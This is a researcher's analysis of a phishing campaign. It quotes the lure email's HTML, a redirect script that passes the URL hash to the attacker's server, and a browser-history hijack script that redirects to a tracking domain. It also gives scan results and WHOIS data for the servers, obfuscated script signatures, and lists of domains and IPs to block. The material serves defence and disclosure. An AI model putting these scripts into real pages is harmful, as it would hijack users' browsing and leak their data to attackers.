# talrezew

## Analysis

Filip Pynckels

Oct 29th, 2024

## Proposition

#### Primary security measures

* Block network trafic to and from 139.45.197.244
* Block network trafic to and from talrezew.net
* Block network trafic to and from my.rtmark.net
* Block network trafic to and from fooshoafoat.com
* Block network trafic to and from r11.o.lencr.org
* Block network trafic to and from ormedion.com
* Block network trafic to and from ocsp.r2m03.amazontrust.com
* Block network trafic to and from account.linktrust.com
* Block network trafic to and from r10.o.lencr.org

#### Secundary security measures

* Block network trafic to and from 34.117.79.165
* Block network trafic to and from hb6trk.com
* Block network trafic to and from www.hb6trk.com
* Block network trafic to and from www.nova360space.com
* Block network trafic to and from www.nowclickithere.com
* Block network trafic to and from www.p0stb4ck.com
* Block network trafic to and from www.misterloading.com
* Block network trafic to and from www.surprisinglyfastr.com
* Block network trafic to and from www.484tr4ck.com
* Block network trafic to and from www.lpminglemesh.com
* Block network trafic to and from www.muchostr4ffic.com
* Block network trafic to and from www.solidtr4ffic.com
* Block network trafic to and from www.loadingspeedfast.com
* Block network trafic to and from www.pvcryu7trk.com
* Block network trafic to and from www.lphorizonhive.com
* Block network trafic to and from www.surgetr4ffic.com
* Block network trafic to and from www.redirected-successfully.com
* Block network trafic to and from www.worldofclicks.net
* Block network trafic to and from www.plhv2trk.com
* Block network trafic to and from www.trafficseason.info
* Block network trafic to and from www.sendtr4ffic.com
* Block network trafic to and from www.internettr4ffic.com
* Block network trafic to and from www.lpnovanet.com
* Block network trafic to and from www.supertr4ffic.com
* Block network trafic to and from www.universeofclicks.com
* Block network trafic to and from www.highqualitylinkclicks.com
* Block network trafic to and from www.craftybyte42.com

#### Tertiary security measures

* Block webpages with signatures in major parts of 6.4.1
* Block webpages with signatures in major parts of 6.4.2
* Block webpages with signatures in major parts of 6.4.3

## 1. Attack vector

A Phishing mail is sent to the potential victim.

When the victim clicks the link a page that seems legitimate is shown. However, when the user revisits the page by means of clicking on the browser history entry of this page, the browser is redirected to a 'You won a gift' page.

But this is not the end. The mentioned page redirects to a malicious page in the Netherlands (Amsterdam).

## 2. Analysis of the first stage of the attack

#### 2.1 eMail

On first sight, the mail contains nothing problematic, except for the following html fragment:

    <img style="display: none" src="http://frthi.trophytakers.com/4a0aeqv2yzcpuog0bsqusxg7wk3ayfwv7lg3lsxhqk7svngsrwxdu33h33o3wvdsdrsjinos5jOUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/f3xnsg0w3ni/ICRNwMNKT9gqe171BRQJh6WpKmDPrqk1BHqzr8Jz0mPY/780564350873669074167519828050420/1xnLjmMeCkxuuqWu87ec98DKMSkD4uWSIIBGMCfjypHc" />

    <a href="https://www.nwwdeest.org/foyfnkfrnosexli" style="text-decoration: none;color:white;">n</a>	
    <p><a href="http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286" style="display: inline-block; padding: 10px 10px; background-color:#ff8000; color: #ffffff; text-decoration: none; border-radius: 15px; font-size: 30px;"> COntroler het afleveraddres</a></p>
    <a href="https://www.emerfggm.org/tycgznqffbyujiq" style="text-decoration: none;color:white;">n</a>

At the day of analysis, the following url was active:

    http://frthi.trophytakers.com

The following urls were not active:

    https://www.emerfggm.org
    https://www.nwwdeest.org

The link in the `img` tag points to a png. More precise: PNG image data, 1 x 1, 8-bit gray+alpha, non-interlaced.

The link in the `a` tag points to a html snippet: HTML document, ASCII text, with CRLF line terminators.

#### 2.2 HTML code snippet

The HTML code snippet is the following:

    <noscript>
    <meta http-equiv="refresh" content="0;url=http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286?r=1">
    </noscript>
    <script>
        url = "http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286";
        hash = window.location.hash.replace('#', '');
        if(hash.length > 0) {
            location.replace(url + "?in=1&ke="+hash);
        } else {
            location.replace(url + "?in=1");
        }
    </script>

This is kind of a recursive loading of the same code snippet with a appended parameters that give information to the server.

The link is:

    http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286

The respective parameters are:

    ?r=1
    ?in=1
    ?in=1&ke="+hash

The `r=1` parameter/Value recurses on the same code snippet.

The `in=1` parameter/value gets a new HTML file/page: HTML document, Unicode text, UTF-8 text, with very long lines (368), with CRLF line terminators

#### 2.3 HTML page

The HTML page towards the browser is redirected uses a number of legitimate links, like:

    http://www.w3.org
    https://use.fontawesome.com
    https://virtualpushplatform.com

It includes legitimate code snippets, like the one defining the function `ddddtttss(ddd)` and the one at the bottom that adds an event listener to the `button1` button.

It also downloads the same code snippet as shown in point 2.2 above, under a different name: ./js/script/js

There are, however, also two new code snippets that must be analyzed:

#### 2.4 Code snippet

This code snippet is located at line 13 of the HTML file. It is a self executing function.

    <script>
        (function (window, location) {
            var redirect = "https://www.hb6trk.com/K31267/9WDPQ6B/"
            var currentUrl = location.origin + location.pathname + location.search;
            if (location.hash !== "#!/hst") {
                history.replaceState(null, document.title, currentUrl + "#!/hst");
                history.pushState(null, document.title, currentUrl);
            }

            window.addEventListener("popstate", function () {
                if (location.hash === "#!/hst") {
                    setTimeout(function () {
                        window.location.replace(redirect);
                    }, 0);
                }
            }, false);
        }(window, location));
    </script>

To make a long story short: when the user goes to the browser history and clicks on the history of the HTML page, the browser is redirected to the url:

    https://www.hb6trk.com/K31267/9WDPQ6B/

## 3. Server of the first stage of the attack

#### 3.1 URL

    https://www.hb6trk.com/K31267/9WDPQ6B/

#### 3.2 IP (ping)

    34.117.79.165 (165.79.117.34.bc.googleusercontent.com)

#### 3.3 Open ports (masscan / nmap -sV -sC --version-intensity 9 34.117.79.165 -p <port> )

    Nmap scan report for 165.79.117.34.bc.googleusercontent.com (34.117.79.165)

    PORT    STATE SERVICE   VERSION

    80/tcp  open  http      nginx
    |_http-server-header: nginx
    |_http-title: Performance Marketing Platform

    443/tcp open  ssl/https nginx
    |_  http/1.1
    | ssl-cert: Subject: commonName=hb6trk.com
    | Not valid before: 2024-10-10T14:41:48
    |_Not valid after:  2025-05-23T16:00:41
    |_http-title: Performance Marketing Platform
    |_ssl-date: TLS randomness does not represent time
    |_http-server-header: nginx

    2 services unrecognized despite returning data.     

    Aggressive OS guesses:
        Crestron XPanel control system (89%)
        FreeBSD 11.0-CURRENT (87%)
        FreeBSD 7.0-RELEASE (87%)
        Epson Stylus Pro 400 printer (87%)
        FreeBSD 8.2-RELEASE (86%)
        FreeBSD 10.2-RELEASE (86%)
        FreeBSD 11.0-RELEASE (86%)
        FreeBSD 11.0-STABLE (86%)
        FreeBSD 11.1-RELEASE (86%)
        FreeBSD 11.1-STABLE (86%)

#### 3.4 Location (https://www.ip2location.com/demo/34.117.79.165)

    IP               Country                   Region      City         ISP               Domain            Coordinates (N,W)
    34.117.79.165    United States of America  Missouri    Kansas City  Google LLC        google.com        39.099730, -94.578570 (39°5'59"N   94°34'43"W)

#### 3.5 Other malicious url's pointing to the same server:

* 34.117.79.165
* hb6trk.com
* www.hb6trk.com
* www.nova360space.com
* www.nowclickithere.com
* www.p0stb4ck.com
* www.misterloading.com
* www.surprisinglyfastr.com
* www.484tr4ck.com
* www.lpminglemesh.com
* www.muchostr4ffic.com
* www.solidtr4ffic.com
* www.loadingspeedfast.com
* www.pvcryu7trk.com
* www.lphorizonhive.com
* www.surgetr4ffic.com
* www.redirected-successfully.com
* www.worldofclicks.net
* www.plhv2trk.com
* www.trafficseason.info
* www.sendtr4ffic.com
* www.internettr4ffic.com
* www.lpnovanet.com
* www.supertr4ffic.com
* www.universeofclicks.com
* www.highqualitylinkclicks.com
* www.craftybyte42.com

#### 3.6 robots.txt

No robots.txt file available

#### 3.7 Other server information (https://stat.ripe.net/app/launchpad/S1_34.117.79.165)

    34.117.79.165 was not found on any blocklist
    Abuse contact: google-cloud-compliance@google.com

## 4. Analysis of the second stage of the attack

When getting the file from:

    https://www.hb6trk.com/K31267/9WDPQ6B/

it looks like a publicity popup script. However, when getting the file from

    wget https://bbmediavip.com/click.php?key=d0bjrnj6r38ifd9fi1zx

the browser is redirected to

    https://talrezew.net/4/4654468?var=D

## 5. Server of the second stage of the attack

#### 5.1 URL

    https://talrezew.net/4/4654468

#### 5.2 IP (ping)

    139.45.197.244

#### 5.3 Open ports (masscan / nmap -sV -sC --version-intensity 9 34.117.79.165 -p <port> )

    Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-10-29 15:12:15 GMT
    Initiating SYN Stealth Scan
    Scanning 1 hosts [65535 ports/host]
    Discovered open port 80/tcp on 139.45.197.244                                  

    PORT   STATE SERVICE VERSION
    80/tcp open  http    nginx
    |_http-title: 403 Forbidden

    Aggressive OS guesses:
        Crestron XPanel control system (89%)
        ASUS RT-N56U WAP (Linux 3.4) (87%)
        Linux 3.1 (87%), Linux 3.16 (87%)
        Linux 3.2 (87%)
        HP P2000 G3 NAS device (87%)
        AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%)
        MikroTik RouterOS 6.0 (86%)
        Linux 4.10 (86%)

    No exact OS matches for host (test conditions non-ideal).

#### 5.4 Location (https://www.ip2location.com/demo/34.117.79.165)

    IP               Country       Region         City         ISP               Domain     Coordinates (N,W)
    139.45.197.244   Netherlands   Noord-Holland  Amsterdam    RETN Limited      retn.net   52.378500, 4.899980 (52°22'43"N   4°53'60"E)

#### 5.5 Other malicious url's pointing to the same server:

* 139.45.197.244
* talrezew.net

#### 5.6 robots.txt

    No robots.txt file available

    HTTP request sent, awaiting response... 403 Forbidden
    2024-10-29 16:18:17 ERROR 403: Forbidden.

#### 5.7 Other server information (https://stat.ripe.net/app/launchpad/S1_139.45.197.244)

    139.45.197.244 was not found on any blocklist
    Abuse contact: claims@networkclaim.com

## 6. Analysis of the third stage of the attack

#### 6.1 URLs

The URL mentioned in point 5.1 loads a HTML page that executes an elaborate obfuscated script that calls the following URL's when executed on a Raspberry Pi:

    http://talrezew.net/sftouch?userId=008104eb447a4129f7b04a20f821c957&z=4654468&p_rid=ae145dbe-e2a2-44cf-9d51-629d2252c992&p_src=sf&branchId=0&rb=sztYDr1txxIYI5kk0ytUgI3ClC9_JzU0AidVMVzC3X3ViuPDQVmVk--ZPbbW5zQ14VbXvAU4WYpOIWGlDmCER235RjSwHoILmJC9JlKYkMH47QKXrjsYbB9C1VhrswViUr0gDxEPC-dAeBR8zmxmAuRr85flCBJ0bR_wZuGTT8v65xru&w_img=1

    http://talrezew.net/log/add?cid=1db9169f-90f4-4b2d-b517-bc47aab19c1f&ruid=ae145dbe-e2a2-44cf-9d51-629d2252c992

    http://talrezew.net/async_log/add?cid=1db9169f-90f4-4b2d-b517-bc47aab19c1f&ruid=ae145dbe-e2a2-44cf-9d51-629d2252c992

    http://talrezew.net/?z=4654468&syncedCookie=true&rhd=false

    https://my.rtmark.net/img.gif?f=merge&userId=008104eb447a4129f7b04a20f821c957&z=4654468&p_rid=ae145dbe-e2a2-44cf-9d51-629d2252c992&p_src=sf

#### 6.2 WhoIs

    Domain Name: TALREZEW.NET
    Registry Domain ID: 2912931623_DOMAIN_NET-VRSN
    Registrar WHOIS Server: whois.pananames.com
    Registrar URL: http://www.pananames.com
    Updated Date: 2024-08-31T22:30:07Z
    Creation Date: 2024-08-31T22:30:05Z
    Registrar Registration Expiration Date: 2025-08-31T22:30:05Z
    Registrar: URL SOLUTIONS INC.
    Registrar IANA ID: 1449
    Registrar Abuse Contact Email: abuse@pananames.com
    Registrar Abuse Contact Phone: +1.4692250522
    Reseller: 
    Domain Status: clientTransferProhibited -- https://icann.org/epp#clientTransferProhibited
    Registry Registrant ID:
    Registrant Name: Private Whois
    Registrant Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Registrant Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Registrant City: Panama
    Registrant State/Province: NA
    Registrant Postal Code: NA
    Registrant Country: PA
    Registrant Phone: +1.4692250522
    Registrant Phone Ext: 
    Registrant Fax: 
    Registrant Fax Ext: 
    Registrant Email: talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Registry Admin ID:
    Admin Name: Private Whois
    Admin Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Admin Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Admin City: Panama
    Admin State/Province: NA
    Admin Postal Code: NA
    Admin Country: PA
    Admin Phone: +1.4692250522
    Admin Phone Ext: 
    Admin Fax: 
    Admin Fax Ext: 
    Admin Email: admin.talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Registry Tech ID:
    Tech Name: Private Whois
    Tech Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Tech Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Tech City: Panama
    Tech State/Province: NA
    Tech Postal Code: NA
    Tech Country: PA
    Tech Phone: +1.4692250522
    Tech Phone Ext: 
    Tech Fax: 
    Tech Fax Ext: 
    Tech Email: tech.talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Name Server: NS-1150.AWSDNS-15.ORG
    Name Server: NS-1635.AWSDNS-12.CO.UK
    Name Server: NS-215.AWSDNS-26.COM
    Name Server: NS-825.AWSDNS-39.NET
    DNSSEC: Unsigned
    >>> Last update of WHOIS database: 2024-08-31T22:30:07Z <<<

    Domain Name: RTMARK.NET
    Registry Domain ID: 1882699297_DOMAIN_NET-VRSN
    Registrar WHOIS Server: whois.pananames.com
    Registrar URL: http://www.pananames.com
    Updated Date: 2024-09-29T06:03:42Z
    Creation Date: 2014-10-29T10:13:55Z
    Registrar Registration Expiration Date: 2025-10-29T10:13:55Z
    Registrar: URL SOLUTIONS INC.
    Registrar IANA ID: 1449
    Registrar Abuse Contact Email: abuse@pananames.com
    Registrar Abuse Contact Phone: +1.4692250522
    Reseller: 
    Domain Status: clientTransferProhibited -- https://icann.org/epp#clientTransferProhibited
    Registry Registrant ID:
    Registrant Name: REDACTED FOR PRIVACY
    Registrant Organization: REDACTED FOR PRIVACY
    Registrant Street: REDACTED FOR PRIVACY
    Registrant City: REDACTED FOR PRIVACY
    Registrant State/Province: REDACTED FOR PRIVACY
    Registrant Postal Code: REDACTED FOR PRIVACY
    Registrant Country: REDACTED FOR PRIVACY
    Registrant Phone: REDACTED FOR PRIVACY
    Registrant Phone Ext: REDACTED FOR PRIVACY
    Registrant Fax: REDACTED FOR PRIVACY
    Registrant Fax Ext: REDACTED FOR PRIVACY
    Registrant Email: rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Registry Admin ID:
    Admin Name: REDACTED FOR PRIVACY
    Admin Organization: REDACTED FOR PRIVACY
    Admin Street: REDACTED FOR PRIVACY
    Admin City: REDACTED FOR PRIVACY
    Admin State/Province: REDACTED FOR PRIVACY
    Admin Postal Code: REDACTED FOR PRIVACY
    Admin Country: REDACTED FOR PRIVACY
    Admin Phone: REDACTED FOR PRIVACY
    Admin Phone Ext: REDACTED FOR PRIVACY
    Admin Fax: REDACTED FOR PRIVACY
    Admin Fax Ext: REDACTED FOR PRIVACY
    Admin Email: admin.rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Registry Tech ID:
    Tech Name: REDACTED FOR PRIVACY
    Tech Organization: REDACTED FOR PRIVACY
    Tech Street: REDACTED FOR PRIVACY
    Tech City: REDACTED FOR PRIVACY
    Tech State/Province: REDACTED FOR PRIVACY
    Tech Postal Code: REDACTED FOR PRIVACY
    Tech Country: REDACTED FOR PRIVACY
    Tech Phone: REDACTED FOR PRIVACY
    Tech Phone Ext: REDACTED FOR PRIVACY
    Tech Fax: REDACTED FOR PRIVACY
    Tech Fax Ext: REDACTED FOR PRIVACY
    Tech Email: tech.rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Name Server: NS01.RTMARK.NET
    Name Server: NS11.RTMARK.NET
    Name Server: NS21.RTMARK.NET
    DNSSEC: Unsigned
    >>> Last update of WHOIS database: 2024-09-29T06:03:42Z <<<

#### 6.3 Rtmark.net

The URL rtmark.net points to

    https://s3-eu-west-1.amazonaws.com

And mentions the name

    Samoukale

It is mentioned by the urlquery.net site as "a monster under the bed"

    https://urlquery.net/report/a8b665ee-7d89-4974-ab6d-760484e4231c

together with some other URLs like there are

* fooshoafoat.com
* r11.o.lencr.org
* ormedion.com
* ocsp.r2m03.amazontrust.com
* account.linktrust.com
* r10.o.lencr.org

#### 6.4 Signature of the script at http://talrezew.net/?z=4654468&syncedCookie=true&rhd=false

Major parts of the following can be uses as malware signature

##### 6.4.1 First malware signature (search for parts, without whitespace)

    T: 'chfu',
    K: 'shapgvba',
    Y: 'po',
    z: 'qngnfrg',
    q: 2,
    S: 3,
    m: 4,
    W: 5,
    v: 6,
    i: 7,
    p: 8,
    V: 9,
    y: 10,
    R: 11,
    D: 12,
    f: 13,
    Q: 14,
    G: 15,
    X: 16,
    U: 17,
    c: 18,
    b: 19,
    B: 20,
    n: 21,
    k: 22,
    w: 23,
    e: 24,
    A: 25,
    N: 'pheeragFpevcg',
    F: 'HEY',
    P: '__qf3qpi__',
    H: 'yratgu',
    o: '__qf3qpI__',
    O: '(=([^&#]*)|&|#|$)',
    M: '=(.*)$',
    Z: 'uers',
    t: 'gehr',
    r: 'KZYUggcErdhrfg',
    J: 'trgOnggrel',
    C: 'zrgubq',
    l: 'ercynpr',
    s: '\\$&',
    h: '[?&]',
    I: 'ybpngvba',
    L: 'rkrp',
    x: '',
    j: 'urnqref',
    a: '&ehvq=',
    ug: 'e_hvq',
    gg: 'xrlf',
    Eg: 'pyvrag_vq',
    dg: 'haxabja',
    Tg: 'nssvyvngr_vq',
    Kg: 'genssvp_fbhepr_vq',
    Yg: 'nqiregvfre_vq',
    zg: 'pnzcnvta_vq',
    qg: 'phfgbz_vq_1',
    Sg: 'phfgbz_vq_2',
    mg: 'pyvpx_vq',
    Wg: 'pbfg',
    vg: 'wfgnt',
    ig: 'bn_vq',
    pg: 'nqqvgvbany_vqf',
    Vg: 'nofbyhgr',
    yg: '50%',
    Rg: '9999',
    Dg: '1ck',
    fg: 'genafcnerag',
    Qg: 'sGlcr',
    Gg: 'punapr',
    Xg: 'sybbe',
    Ug: 'pyvragVq',
    cg: 'nkpvq',
    bg: 'genssvpFbheprVq',
    Bg: 'nkgfvq',
    ng: 'nssvyvngrVq',
    kg: 'nknssvq',
    wg: 'nqiregvfreVq',
    eg: 'nknqivq',
    Ag: 'pnzcnvtaVq',
    Ng: 'nkpnzvq',
    Fg: 'phfgbzVq1',
    Pg: 'nkphfvq1',
    Hg: 'phfgbzVq2',
    og: 'nkphfvq2',
    Og: 'pyvpxVq',
    Mg: 'pyvq',
    Zg: 'nksg',
    tg: 'sHey',
    rg: 'nksh',
    Jg: 'gvgyr',
    Cg: 'nkgvg',
    lg: 'gbYbjrePnfr',
    sg: 'fgevatvsl',
    hg: 'fraq',
    Ig: 'cnefr',
    Lg: 'ehVq',
    xg: 'bnVq',
    jg: 'perngrRyrzrag',
    ag: 'qvi',
    uE: 'frgNggevohgr',
    gE: 'vq',
    EE: 'nqrk',
    dE: 'cbfvgvba',
    TE: 'gbc',
    KE: 'yrsg',
    YE: 'mVaqrk',
    zE: 'jvqgu',
    qE: 'urvtug',
    SE: 'onpxtebhaqPbybe',
    mE: 'orsber',
    WE: 'vf_ong',
    vE: 'punetvat',
    iE: 'punetvat_gvzr',
    pE: 'qvfpunetvat_gvzr',
    VE: 'yriry',
    yE: '{(.*?)\\}',
    RE: 101,
    DE: 'sbeRnpu',
    fE: '[\\[\\]]',
    QE: 't',
    GE: 'frnepuCnenzf',
    XE: 'ovaq',
    UE: '/nqq?pvq=',
    cE: 'nqqvgvbanyVqf',
    bE: 'bagbhpufgneg',
    BE: 'gf_qrgrpgrq',
    nE: 'CyhtvaNeenl',
    kE: 'trgTnzrcnqf',
    wE: 'pbybe_tnzhg',
    eE: 'puebzr',
    AE: 'ybnqGvzrf',
    NE: 'cyngsbez_qrgrpgbe',
    FE: 'fglyr',
    PE: 'trg',
    HE: 'bcra',
    oE: 'CBFG',
    OE: '-2',
    ME: 'znkGbhpuCbvagf',
    ZE: ';',
    tE: 'jroqevire',
    rE: 'tnzrcnqf',
    JE: 'pfv',
    CE: 'pyg',
    lE: 'vf_naqebvq',
    sE: 'vf_gevqrag',
    hE: 'vf_puebzvhz_86_be_arjre',
    IE: 'vf_puebzvhz',
    LE: 'vf_rqtr',
    xE: 'vf_trpxb',
    jE: 'vf_jro_xvg',
    aE: 'vf_jro_xvg_606_be_arjre',
    ud: 'vf_qrfxgbc_fnsnev',
    gd: 'vf_puebzvhz_bcren',
    Ed: 'arf',
    dd: 'dhrelFryrpgbe',
    Td: 'obql',
    Kd: 'enaqbz',
    Yd: 'nqrk_gnt_irefvba',
    zd: '248_2_BS',
    qd: 'heyCnenzf',
    Sd: 500,
    md: ' ',
    Wd: '/nflap_ybt',
    vd: '/ybt',
    id: 'nqqRiragYvfgrare',
    pd: 'ybnq',
    Vd: 'frgErdhrfgUrnqre',
    yd: 'kkkkkkkk-kkkk-4kkk-lkkk-kkkkkkkkkkkk',
    Rd: 'ev',
    Dd: 'ei',
    fd: 'ecc',
    Qd: 'pnainf',
    Gd: 'nycun',
    Xd: 'qrcgu',
    Ud: 'fgrapvy',
    cd: 'nagvnyvnf',
    bd: 'cerzhygvcyvrqNycun',
    Bd: 'cerfreirQenjvatOhssre',
    nd: 'snvyVsZnwbeCresbeznaprPnirng',
    kd: 'trgRkgrafvba',
    wd: 'JROTY_qroht_eraqrere_vasb',
    ed: 'abj',
    Ad: 'gmb',
    Nd: 'jj',
    Fd: 'bhgreJvqgu',
    Pd: 'ju',
    Hd: 'bhgreUrvtug',
    od: 'jvj',
    Od: 'vaareJvqgu',
    Md: 'jvu',
    Zd: 'vaareUrvtug',
    td: 'jk',
    rd: 'fperraK',
    Jd: 'jl',
    Cd: 'fperraL',
    ld: 'vk',
    sd: 'jsp',
    hd: 'zfZnkGbhpuCbvagf',
    Id: 'wfhn',
    Ld: 'hfreNtrag',
    xd: 'ac',
    jd: 'cq',
    ad: 'hvq',
    uT: 'qes',
    gT: 'ersreere',
    ET: 'cy',
    dT: 'at',
    TT: 'gm',
    KT: 'ao',
    YT: 'anc',
    zT: 'cyngsbez',
    qT: 'cg',
    ST: 'riny',
    mT: 'qz',
    WT: 'fgevat',
    vT: 'egg',
    iT: 'pu_bow',
    pT: 'aj',
    VT: 'jq',
    yT: 'bfpch',
    RT: 'uvqqra',
    DT: 'pu_bow_vaqrk',
    fT: 'jva_xrlf_yratgu',
    QT: 'pbybe_qrcgu',
    GT: 'iraqbe',
    XT: 'ay',
    UT: 'ayf',
    cT: 'erp2020',
    bT: 'c3',
    BT: 'feto',
    nT: 'zngpurf',
    kT: 'baybnqG',
    wT: 'cntrG',
    eT: 'fgnegR',
    AT: 'gena',
    NT: 'gbFgevat',
    FT: 'erqverpg',
    PT: 'frnepu',
    HT: function(a, b) {
      return new RegExp(a, b)
    },
    oT: 'vfNeenl',
    OT: 'trgPbagrkg',
    MT: 'zbm-jroty',
    ZT: 'trgCnenzrgre',
    tT: 'ebhaq',
    rT: 'trgGvzrmbarBssfrg',
    JT: 'fperra',
    CT: 'qbphzragRyrzrag',
    lT: 'cyhtvaf',
    sT: ':',
    hT: 'vfCV',
    IT: 'aVfCV',
    LT: 'Vagy',
    xT: 'gvzrMbar',
    jT: 'uneqjnerPbapheerapl',
    aT: 'ahzore',
    uK: 'up',
    gK: 'qrivprZrzbel',
    EK: 'vaqrkBs',
    dK: 'pbybeQrcgu',
    TK: 'ynathntr',
    KK: 'csy',
    YK: 'vfObgOlCntrG',
    zK: 'zzu',
    qK: '\\+',
    SK: '7936mqluho8vl9nwaxe4az',
    mK: 'wbva',
    WK: '[kl]',
    vK: 'jroxvg-3q',
    iK: 'HAZNFXRQ_ERAQRERE_JROTY',
    pK: 'frys',
    VK: 'senzrf',
    yK: 'pbaarpgvba',
    RK: 'ynathntrf',
    DK: ',',
    fK: 'zngpuZrqvn',
    QK: 'naprfgbeBevtvaf',
    GK: '0123456789nopqrs',
    XK: 'rkcrevzragny-jroty',
    UK: 'fnu',
    cK: 'ninvyUrvtug',
    bK: 'fu',
    BK: 'fj',
    nK: 'fnj',
    kK: 'ninvyJvqgu',
    wK: 'pj',
    eK: 'pyvragJvqgu',
    AK: 'pu',
    NK: 'pyvragUrvtug',
    FK: 'svyranzr',
    PK: 'trbybpngvba',
    HK: 'erfbyirqBcgvbaf',
    oK: 'fraqOrnpba',
    OK: 'pnyyCunagbz',
    MK: '_cunagbz',
    ZK: ')',
    tK: 'pbzzvgYbnqGvzr',
    rK: 'pbaarpgvbaVasb',
    JK: 'svavfuQbphzragYbnqGvzr',
    CK: 'svavfuYbnqGvzr',
    lK: 'svefgCnvagNsgreYbnqGvzr',
    sK: 'svefgCnvagGvzr',
    hK: 'anivtngvbaGlcr',
    IK: 'acaArtbgvngrqCebgbpby',
    LK: 'erdhrfgGvzr',
    xK: 'fgnegYbnqGvzr',
    jK: 'jnfNygreangrCebgbpbyNinvynoyr',
    aK: 'jnfSrgpurqIvnFcql',
    uY: 'jnfAcaArtbgvngrq',
    gY: 'bofreir',
    EY: 'e',
    dY: 'eo',
    TY: 'jroty2',
    KY: 'jroty',
    YY: 'HAZNFXRQ_IRAQBE_JROTY',
    zY: 'svygre',
    qY: '(pbybe-tnzhg:',
    SY: 'ZFPFFZngevk',
    mY: 'zfFrgVzzrqvngr',
    WY: 'zfVaqrkrqQO',
    vY: 'zfCbvagreRanoyrq',
    iY: 'jroxvgCrefvfgragFgbentr',
    pY: 'jroxvgGrzcbenelFgbentr',
    VY: 'jroxvgErfbyirYbpnySvyrFlfgrzHEY',
    yY: 'OnggrelZnantre',
    RY: 'jroxvgZrqvnFgernz',
    DY: 'jroxvgFcrrpuTenzzne',
    fY: 'NccyrCnlReebe',
    QY: 'PFFCevzvgvirInyhr',
    GY: 'Pbhagre',
    XY: 'trgFgbentrHcqngrf',
    UY: 'JroXvgZrqvnXrlf',
    cY: 'ohvyqVQ',
    bY: 'ZrqvnErpbeqreReebeRirag',
    BY: 'zbmVaareFperraK',
    nY: 'PFFZbmQbphzragEhyr',
    kY: 'PnainfPncgherZrqvnFgernz',
    wY: 'gura',
    eY: 'ong',
    AY: 'bevtva',
    NY: 'uggcf://syrenceg.pbz',
    FY: 'QngrGvzrSbezng',
    PY: 'zfJevgrCebsvyreZnex',
    HY: 'ZFFgernz',
    oY: 'zfYnhapuHev',
    OY: 'zfFnirOybo',
    MY: 'fnsnev',
    ZY: 'EGPRapbqrqNhqvbSenzr',
    tY: '[bowrpg Vagy]',
    rY: '[bowrpg Ersyrpg]',
    JY: 'QBZErpgYvfg',
    CY: 'EGPCrrePbaarpgvbaVprRirag',
    lY: 'FITTrbzrgelRyrzrag',
    sY: 'bagenafvgvbapnapry',
    hY: 'babevragngvbapunatr',
    IY: 'bevragngvba',
    LY: 'uggcf://qngngrpubareg.pbz',
    xY: 'uggcf://qngngrpubar.pbz',
    jY: 'Tbbtyr',
    aY: 'Nccyr',
    uz: 'QrivprZbgvbaRirag',
    gz: 'batrfgherraq',
    Ez: 'fgnaqnybar',
    dz: 'ZrqvnFrggvatfEnatr',
    Tz: 'FunerqJbexre',
    Kz: 'ngbo',
    Yz: 'pnyyonpx',
    zz: 'nccyl',
    qz: 'sebzPunePbqr',
    Sz: 'ZbmNccrnenapr',
    mz: 'Ersyrpg',
    Wz: 'grfg',
    vz: 'fgnghf',
    iz: 'qrsvarCebcregl',
    pz: 'punePbqrNg',
    Vz: 'k',
    yz: 'nccIrefvba',
    Rz: 'naqebvq',
    Dz: 'v',
    fz: 'inyhr',
    Qz: 'rahzrenoyr',
    Gz: 'pbasvthenoyr',
    Xz: 'nyy',
    Uz: 'pnpur-wf-gnt',
    cz: 'erfcbafr',
    bz: 'punetvatGvzr',
    Bz: 'qvfpunetvatGvzr',
    nz: 'fyvpr',
    kz: 'pyvragVasbezngvba',
    wz: 'vfVagrefrpgvat',
    ez: 'erzbir',
    Az: 'qvfpbaarpg',
    Nz: 'uvqqra_vsenzr',
    Fz: 'nffvta'

##### 6.4.2 Second malware signature (search for parts, without whitespace)

    jsp: z,
    ng: G,
    ix: q,
    pt: X,
    np: k,
    nw: j,
    nb: Q,
    sw: Z,
    sh: nn,
    pl: un,
    wy: J,
    wx: Y,
    ww: en,
    wh: tn,
    cw: ln,
    wiw: on,
    wih: rn,
    wfc: sn,
    sah: an,
    navlng: dn,
    drf: cn,
    wgl: yn,
    tb: K,
    btz: mn,
    bto: pn,
    pnt: vn,
    pnrc: hn,
    bml: fn,
    bmi: gn,
    vsbl: xn

##### 6.4.3 Third malware signature (search for parts, without whitespace)

    l: opt.zoneId,
    r: opt.rid,
    m: opt.isAab,
    n: opt.request_ab2,
    e: opt.globalIdPixelURL,
    p: opt.skipCookieSync,
